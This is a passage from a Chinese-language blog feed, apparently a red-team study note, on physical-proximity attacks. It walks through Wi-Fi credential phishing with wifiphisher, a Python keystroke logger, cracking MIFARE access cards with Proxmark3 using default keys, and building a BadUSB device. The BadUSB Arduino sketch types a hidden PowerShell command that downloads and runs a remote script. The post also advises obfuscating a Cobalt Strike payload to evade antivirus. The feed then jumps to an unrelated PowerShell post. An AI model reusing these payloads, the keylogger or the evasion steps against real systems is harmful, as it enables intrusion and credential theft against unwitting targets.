<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630151652752.png" alt="image-20220630151652752"></p>
<p>现在就等它破解成功就行了，不过这个有点玄学，我试了好几次，用了几台设备才破解成功一次（密码是12345678）不可能搞不到，虽然说一条龙服务，但是不成功的几率还是太大了，所以第一种的方式会好点，如果没时间盯着的可以选择这一招。</p>
<h2 id="WIFI钓鱼"><a href="#WIFI钓鱼" class="headerlink" title="WIFI钓鱼"></a>WIFI钓鱼</h2><h3 id="wifiphisher"><a href="#wifiphisher" class="headerlink" title="wifiphisher"></a>wifiphisher</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>wifiphisher会针对在攻击中选择的wifi进行强制连接，然后使连接目标wifi的客户机都下线，再通过自身的网卡发射一个伪装好的wifi，并显示钓鱼页面，然后获取到被攻击wifi的密码，相比起自己发射个wifi，然后诱导现场工作人员来连接这个wifi获取上网信息的钓鱼不同，他的成功率会更高点，而且在近源攻击中， 接近的都是安全意识较强的人群，凭空出现一个热点，很少会有人去连接，而且我们的目的是进入对方内网，我自己发射个热点虽然能够监测到上网信息，但是能不能进内网还得看人品，所以，wifiphisher相对来说好一点。</p>
<h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>安装wifiphisher，执行以下命令（网卡接入部分就不用说了，上面有）</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">apt-get <span class="keyword">install</span> wifiphisher</span><br><span class="line">cd Wifiphisher <span class="comment"># 切换到 tools 目录</span></span><br><span class="line">sudo python setup.py <span class="keyword">install</span> <span class="comment"># 安装依赖</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630160631978.png" alt="image-20220630160631978"></p>
<p>安装完成之后，把wifiphisher打开就可以开始选择热点进行钓鱼，执行以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wifiphisher</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630161148697.png" alt="image-20220630161148697"></p>
<p>接着就会进入监听状态，查看附近有什么信号源，跟其他的工具差不多，都会把信道，连接数量显示出来，这里尽量选择已经有连接的wifi，不然没人连接的得等到啥时候</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630161229339.png" alt="image-20220630161229339"></p>
<p>然后使用鼠标滚轮或者小键盘的方向键，上上下下寻找你要攻击的wifi，这里我们继续选择AX这个wifi，回车确定就会出现you have selected AX</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630161616641.png" alt="image-20220630161616641"></p>
<p>接下来是选择攻击模式，网络管理器连接，就是模拟wifi连接失败，然后需要重新连接认证这样获得密码</p>
<p>请求预共享密钥。</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220701104553982.png" alt="image-20220701104553982"></p>
<p>然后就会跳转到这个页面下，显示已经连接的用户，已经进入钓鱼页面的用户还有监听到的密码数据</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220701103901610.png" alt="image-20220701103901610"></p>
<p>看下用户端的情况，当我们开始钓鱼的时候，wifiphisher会发射一个跟被攻击wifi的名称一样的wifi，然后用户就会莫名其妙的下线了，需要重新连接，然后会跳出一个认证页面</p>
<img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220701104036604.png" alt="image-20220701104036604" style="zoom: 33%;">

<p>接着当用户输入密码进行验证之后，我们就得到了原来wifi的密码了，又一次顺利进入内网😏如果他不信这个，点击了取消的话，页面就会提示这个无线局域网尚未接入互联网，可以说是很逼真了，对付一般的工作人员还是有用的，而且对于政府部门，医院这种，你自己发射个wifi信号出去，能够钓到人，但没准是来办业务的人呢？你监听不到什么有用的数据，所以这种方式会更加有优势一点。</p>
<img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220701104933764.png" alt="image-20220701104933764" style="zoom:33%;">

<h2 id="键盘记录器"><a href="#键盘记录器" class="headerlink" title="键盘记录器"></a>键盘记录器</h2><p>键盘记录器从字面上来解释，就是记录监控输入的仪器，可监控到键盘的每一次敲击，有基于硬件和软件两种类型。很多时候会被用于不正当的用途，用来盗取别人的密码信息。可能是通过U口插入的U盘，或者是网络上通过邮件，网页链接，聊天软件来进行传播的。</p>
<h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><p>屏幕键盘记录精灵，该电脑键盘记录软件当启动监控后，键盘将详细的记录电脑上的一举一动。适用于所有应用程序，如QQ,MSN,Skype,word,excel,记事本，写字板，IE页面等任何键盘输入程序并发送到指定的邮箱内，软件功能包括：键盘的所有输入输出，定时截取屏幕图片保存到指定文件夹内，定时将记录下来的图片和文本发送到指定邮箱，电脑重启后软件能够自动隐藏运行</p>
<p>网上百度一大堆，大部分是没免杀的，而且都要注册码，要我掏钱还不如噶我腰子，这里运气好找到个可以试用的</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220707165137551.png" alt="image-20220707165137551"></p>
<p>开启监控之后随便敲几下键盘，然后查看记录，可以看到我们刚刚敲的东西</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220707165256622.png" alt="image-20220707165256622"></p>
<p>其实还能定时截图的，每隔五秒就会截图一次</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220707165538794.png" alt="image-20220707165538794"></p>
<p>功能挺完善的，还能定时把数据发送到指定邮箱，并且删除掉数据，把数据删除就不会因为截图太多把占用太多内存，引起怀疑，缺点就是没有免杀，如果免杀了的话，也算是个利器来的，有条件的大佬也可以自己用py写个脚本，类似于这种</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># 记录</span></span><br><span class="line"><span class="keyword">from</span> pynput <span class="keyword">import</span> keyboard, mouse</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">&#x27;monitor.log&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_press</span>(<span class="params">key</span>):</span></span><br><span class="line">    logger.debug(<span class="string">f&#x27;键盘输出：<span class="subst">&#123;key&#125;</span> &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_release</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="keyword">if</span> key == keyboard.Key.esc:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>():</span></span><br><span class="line">    <span class="keyword">with</span> keyboard.Listener(on_press=on_press, on_release=on_release) <span class="keyword">as</span> lsn:</span><br><span class="line">        lsn.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_click</span>(<span class="params">x, y, button, pressed</span>):</span></span><br><span class="line">    <span class="keyword">if</span> button == mouse.Button.left:</span><br><span class="line">        logger.debug(<span class="string">&#x27;鼠标左键点击&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> button == mouse.Button.right:</span><br><span class="line">        logger.debug(<span class="string">&#x27;鼠标右键点击&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logger.debug(<span class="string">&#x27;mid被点击&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>():</span></span><br><span class="line">    <span class="keyword">with</span> mouse.Listener(on_click=on_click) <span class="keyword">as</span> listener:</span><br><span class="line">        listener.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t1 = Thread(target=f1)</span><br><span class="line">    t2 = Thread(target=f2)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220707172039548.png" alt="image-20220707172039548"></p>
<p>后续再进行扩展，通过发送到邮箱等方式获取信息，灰鸽子，CS都有类似的功能，但大概率会被发现，没有硬件设备隐蔽。</p>
<h3 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h3><p>和软件的键盘记录器一样，它会记录下用户在键盘上的所有输入，比如账号密码、网址、手机号等等，硬件版本的独特之处在于：即使现在各种防御措施，已经能防御大多数软件键盘记录器，但是基于硬件的键盘记录器，对于操作系统来说是无感知的，毕竟它就是一个标准的输入设备。识别和防御也就变得十分困难了。</p>
<p>如何得到这样一个利器，国内外的平台上都有买现成的成品，不过价格略贵，某强北的价格是210块钱左右，这个算是比较亲民的了，而国外一些专门卖这种设备的平台，一个就要一两百美刀或者欧元，巨贵，还不如噶我腰子，当然也有很多开源项目，如果懂硬件的大表哥可以自己买开发板制作，成本直接下降一大半，开源设计有spacehuhn的wifi_keylogger：<a href="https://github.com/spacehuhn/wifi_keylogger%EF%BC%8C%E4%BB%A5wifi_keylogger%E4%B8%BA%E4%BE%8B%EF%BC%8C%E5%AE%83%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8EArduino%E7%9A%84%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8%E3%80%82%E5%B8%A6%E6%9C%89Wi-Fi%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%AD%98%E5%82%A8%E8%AE%B0%E5%BD%95%E5%88%B0%E7%9A%84%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5%EF%BC%8C%E5%B9%B6%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E5%85%B6%E5%8F%91%E5%87%BA%E7%9A%84Wi-Fi%E7%BD%91%E7%BB%9C%E6%9F%A5%E7%9C%8B%E8%AE%B0%E5%BD%95%E6%95%B0%E6%8D%AE%E3%80%82">https://github.com/spacehuhn/wifi_keylogger，以wifi_keylogger为例，它是一个基于Arduino的键盘记录器。带有Wi-Fi功能，可以存储记录到的键盘输入，并可以通过其发出的Wi-Fi网络查看记录数据。</a></p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220708163027875.png" alt="image-20220708163027875"></p>
<p>看起来好像挺大的，好像装到电脑后面马上就会被发现，原因是因为USB键盘使用了HID协议，对于Arduino来说，速度太快没办法读取，所以除了使用Arduino，还需要使用其它的设备用于读取HID协议，也就是USB Host Shield，原作者通过用转换器将USB转换成PS2的键盘，然后通过分析PS2的协议读取HID的协议，虽然解决了速度问题，但是缺点就是太大了，而且会造成不兼容的问题，例如键盘上有一些按键用不了之类的，那如果要解决这类问题的话，其实可以更换芯片，然后重新设计PCB，但是这种太过复杂（对会的人来说可能挺简单的），但是对于我们这种只是想要短时间内马上就能用到，并且有成效的话，总不能还要我去学吧？所以这里的话，建议大家买现成的，资源自寻百度（狗头保命）</p>
<h2 id="Proxmark-3"><a href="#Proxmark-3" class="headerlink" title="Proxmark 3"></a>Proxmark 3</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>Proxmark3是一款国外安全团队研发的开源设备，内置高频和低频天线，能够识别和读取大部分的RFID卡片，而且国内的PM3还可以通过转接头等工具和手机电脑连接，达到跨平台的效果，日常用的卡片有两种，一种是ID卡，一种是IC卡，ID卡内的卡号读取很容易，不需要权限，所以很容易仿制，而IC卡内的数据读取需要权限认证，有些IC卡的每个扇区都有不同的认证密码，所以破解难度会相对较高，但是由于IC卡中存在伪随机数发生器，造成了一定的安全问题，而Proxmark3和其他的读卡设备可以自由控制线圈通电时间，从而绕过部分安全验证，破解出IC卡的密码。</p>
<p>例如这种16扇区，64扇块的M1卡，内部的数据存储形式是这样的</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220708171121280.png" alt="image-20220708171121280"></p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220708171134879.png" alt="image-20220708171134879"></p>
<p>常用的M1卡主要有NXP生产的S50和S70，都是属于MifareClassic家族。以S50为例，国内兼容的最好的厂家是上海复旦微电子生产的FM11RF08芯片，二者的区别在控制位上，控制位主要是读卡器在验证卡的时候所用到的，不同的控制位表示不同的验证方式，NXP的S50前15个扇区的密码块的控制位是：“FF078069”，最后1个扇区的密码快的控制位是：“FF0780BC”。</p>
<p>而复旦FM11RF08芯片的所有扇区的所有控制位均为：“FF078069”。接着就是看芯片第0扇区第0块的代码，从第10位开始看，如果后面是“08040062636”就是复旦的芯片，而如果是“08040023569”就是贝岭芯片。</p>
<p>MifareClassic 1k共有16个扇区，分别为0-15个扇区；每个扇区有4块，分别为0-3块，每个块有32个字符；0扇区的0块为只读块，只存储厂商代码和UD号。</p>
<p>其他每个扇区的前3块为数据库，最后一块为密码块。密码块的前12个字符为A区密码，中间8个字符为控制位，后面12个字符为B区密码。</p>
<h3 id="默认口令爆破"><a href="#默认口令爆破" class="headerlink" title="默认口令爆破"></a>默认口令爆破</h3><p>IC卡在制造时制造厂商为了方便会将除0扇区之外的扇区的所有密码默认设置为FFFFFFFFFFFF，这就是IC卡片的默认密码，所以可以使用PM3对卡片的默认密码进行爆破。早期的PM3要把高频天线连接到Proxmark3的天线接口，并且连接完成之后要查看一下天线与PM3连接之后的工作电压是否正常；国产的PM3工具在设计时就将高频天线和低频天线安装到一起，在使用时只需要实用工具对其电压等进行探测是否正常。</p>
<p>这里简要说下过程，如果想要看图的话，可以自行百度，网上也有教程</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#工具准备</span></span><br><span class="line"><span class="attribute">Proxmark3</span></span><br><span class="line"><span class="attribute">IC</span>卡片</span><br><span class="line"><span class="attribute">Proxmark3</span> Easy GUI</span><br><span class="line"><span class="comment">#实施过程</span></span><br><span class="line"><span class="attribute">1</span>、先用数据线将Proxmark<span class="number">3</span>和电脑连接，然后找到相对应的串口，连接成功后检测下工作电压</span><br><span class="line"><span class="attribute">2</span>、把准备好的IC卡放到高频卡读卡器位置，查看天线电压的变化，如果高频天线的电压下降了，说明我们买到的是高频IC卡，先读取卡片类型</span><br><span class="line"><span class="attribute">3</span>、先检测是否存在出厂时遗留的key，默认key有</span><br><span class="line"><span class="attribute">nffffffffffff</span></span><br><span class="line"><span class="attribute">nbob1b2b3b4b5</span></span><br><span class="line"><span class="attribute">n000000000000</span></span><br><span class="line"><span class="attribute">na0ala2a3a4a5</span></span><br><span class="line"><span class="attribute">naabbccddeeff</span></span><br><span class="line"><span class="attribute">n714c5c886e97</span></span><br><span class="line"><span class="attribute">na0478cc39091</span></span><br><span class="line"><span class="attribute">4</span>、通过默认密码扫描，看能不能读取到某个扇区的密码</span><br><span class="line"><span class="attribute">5</span>、利用嵌套认证漏洞使用任何一个扇区的已知密匙，获取所有扇区的密匙，此漏洞成功率较高，这个漏洞也被称作知一密求全密，如果从上一步中已经知道其中的几个扇区的默认密码，使用PM<span class="number">3</span>的知一密求全密的功能对扇区进行破解</span><br><span class="line"><span class="attribute">6</span>、如果上面的方式不行，那就使用PRNG漏洞进行破解，Proxmark<span class="number">3</span>基于PRNG的安全缺陷是进行随机数碰撞，利用PRNG的安全缺陷我们可以很快速地得到对应的密钥，从而进行进一步的破解操作。</span><br><span class="line"><span class="comment">#MIFARE Classic采用的是Crypto-1私有加密算法，其算法的特点就是对称式的密码算法或者说是私钥密码系统。其主要组成部分是伪随机数发生器（PRNG）、48位的线性反馈移位寄存器（LFSR）以及非线性函数。由于算法当中的Filter Function的设计出现缺陷，导致改变线性反馈移位寄存器的后8位数值就有可能得到所对应的Keystream。这个缺陷类似于802.11bWEP算法，不同的明文有极高的可能性被相同的Keystream，使得整个加密算法出现了漏洞。</span></span><br><span class="line"><span class="attribute">7</span>、如果上面两种方式都不行，也可以尝试RFID嗅探，RFID嗅探也是一种非常常见的RFID攻击方式，对于一些卡片无法使用默认密码或者PRNG漏洞攻破其密码，但是仍然可以使用嗅探的方式对其进行攻击，从而嗅探出密码。</span><br><span class="line"><span class="attribute">8</span>、破解完就是复制卡片了，没啥难度</span><br></pre></td></tr></table></figure>

<h2 id="Badusb"><a href="#Badusb" class="headerlink" title="Badusb"></a>Badusb</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>Badusb，也就是利用HID接口的类似于U盘的东西，HID（人体学接口设备）是一个设备类定义，用于将 PS/2 样式的连接器替换为支持 HID 设备（例如键盘、鼠标、游戏控制器等）的通用USB 驱动程序，在 HID 之前，设备只能对鼠标和键盘使用严格定义的协议。硬件创新要求使用现有协议重载数据，或使用其自己的专用驱动程序创建非标准硬件， HID为这些“启动模式”设备提供了支持，同时通过可扩展、标准化且易于编程的接口添加对硬件创新的支持。简单来说HID设备就是键盘这种输入设备 而HID攻击呢，其实就是指利用模拟键盘的输入进行的攻击，其内部结构是这样的</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220710160831095.png" alt="image-20220710160831095"></p>
<p>从这张图便可以了解到Badusb和普通的U盘并没有什么两样，因此迷惑性极高，很容易攻击成功，在2014年美国黑帽大会上，安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。</p>
<p>Badusb插入后，会模拟键盘对电脑进行操作，通过这些操作打开电脑的命令终端，并执行一条命令，这条命令将从指定网址下载恶意代码(通常为powershell脚本)并于后台静默运行。这些代码功能包括：窃取信息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。</p>
<p>关于硬件，各大平台都有在卖现成的，例如万能的某宝，某鱼，或者Hak5，Hak5上面的价格十分《亲民》谨慎购买，橡皮鸭算是上面比较亲民的了50刀的样子，毕竟实际攻防的时候，丢地上最后去哪了都不知道，血亏几百刀。</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220718145147795.png" alt="image-20220718145147795"></p>
<h3 id="自制Badusb"><a href="#自制Badusb" class="headerlink" title="自制Badusb"></a>自制Badusb</h3><p>别人能做那当然也可以自己制作，熟悉Arduino的大佬，完全可以自己买块开发板回来自己烧录，而且网上有现成的教程和代码，直接CCV就行了。</p>
<h4 id="开发板烧录过程"><a href="#开发板烧录过程" class="headerlink" title="开发板烧录过程"></a>开发板烧录过程</h4><p>1、买个经典版的橡皮鸭rubber ducky（其他开发板也可以）<br>2、在CS上面生成个ps1文件格式Powershell可执行的程序<br>3、对CS生成的Ps文件进行免杀（这里可以用Invoke-Obfuscation进行免杀，<a href="https://github.com/danielbohannon/Invoke-Obfuscation%EF%BC%89">https://github.com/danielbohannon/Invoke-Obfuscation）</a><br>4、安装Digispark （Attiny85）开发板驱动。</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220719162400830.png" alt="image-20220719162400830"></p>
<p>5、打开Arduino软件，点击文件中的首选项，附加开发板管理器网址填入：<a href="https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json">https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json</a></p>
<p>6、点击工具中的开发板中的开发板管理器，等待下载索引完成（下载不成功请使用海外代理），搜索并安装“Digistump AVR Boards by Digistump”，安装完成后在开发板中选择Digispark（Default-16.5mhz）</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220719162553999.png" alt="image-20220719162553999"></p>
<p>7、将以下代码填入Arduino代码框中，以实现伪造键盘输出win+r打开运行窗口并执行Powershell命令：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span>&#123;<span class="comment">//初始化 </span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通讯 </span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//延时 </span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键 </span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">&#x27;r&#x27;</span>); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">delay</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#x27;http://8.8.8.8/main.ps1&#x27;) &quot;</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯 </span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通讯 </span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//延时 </span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键 </span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">&#x27;r&#x27;</span>); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">delay</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#x27;http://8.8.8.8/payload.ps1&#x27;) &quot;</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>8、将代码上传到开发板中，等待烧录完成即可，烧录成功之后，插入电脑即可上线</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>近源渗透相比普通的渗透测试可能成本更高，毕竟一个设备动不动就要一两百美刀，谁顶得住啊，但是如果能更好的掌握社工技巧会事半功倍，而且对于蓝队来说更是防不胜防，有可能自己在网络这块防得死死的，被现场的好队友捡到的u盘送走了，虽然设备费用贵，但贵有贵的道理，从另一个方面讲，以后的常规渗透测试肯定也会越来越多的结合近源渗透测试的一些手段和方法，这不仅仅是提高了红队的攻击能力，同时也是对蓝队防守能力在更高维度上提出了要求。</p>
]]></content>
      <categories>
        <category>近源攻击</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>近源攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>PowerShell Community</title>
    <url>/2023/04/17/PowerShell-Community/</url>
    <content><![CDATA[<p><strong>学习链接：</strong></p>
<p><a href="https://devblogs.microsoft.com/scripting/">https://devblogs.microsoft.com/scripting/</a></p>
<p><a href="https://devblogs.microsoft.com/powershell-community/">https://devblogs.microsoft.com/powershell-community/</a></p>
<p><a href="https://blog.csdn.net/culinxia2707/article/details/108771878">https://blog.csdn.net/culinxia2707/article/details/108771878</a></p>
<span id="more"></span>

<h2 id="通过PowerShell更改驱动器字母和标签"><a href="#通过PowerShell更改驱动器字母和标签" class="headerlink" title="通过PowerShell更改驱动器字母和标签"></a>通过PowerShell更改驱动器字母和标签</h2><p>问题：如何通过PowerShell更改驱动器字母和标签？</p>
<p>解答：其中一种方法是通过WMI和CIM命令来修改。</p>
<p>PowerShell没有cmdlet来直接更改驱动器号或标题，但好消息是，您可以使用WMI和CIM cmdlet来更改驱动器号和驱动器标签。Windows管理工具有cmdlet (<code>Set-Partition</code>和<code>Set-Volume</code>)可以直接修改盘符和标题。但是知道如何通过WMI和CIM cmdlet来更改驱动器号和驱动器标签也是很有帮助的。实际上，当你使用<code>Set-Partition</code>时，你实际上是在使用WMI。Windows存储和Windows网络团队都大量使用WMI，并通过CDXML模块公开cmdlet。</p>
<ul>
<li>WMI系统类是基于公共信息模型(CIM)的预定义类的集合。</li>
</ul>
<h3 id="WMI类，类属性和类方法"><a href="#WMI类，类属性和类方法" class="headerlink" title="WMI类，类属性和类方法"></a>WMI类，类属性和类方法</h3><p>WMI以WMI类的形式保存了大量关于Windows主机的信息。每个IT专业人士都应该了解WMI。</p>
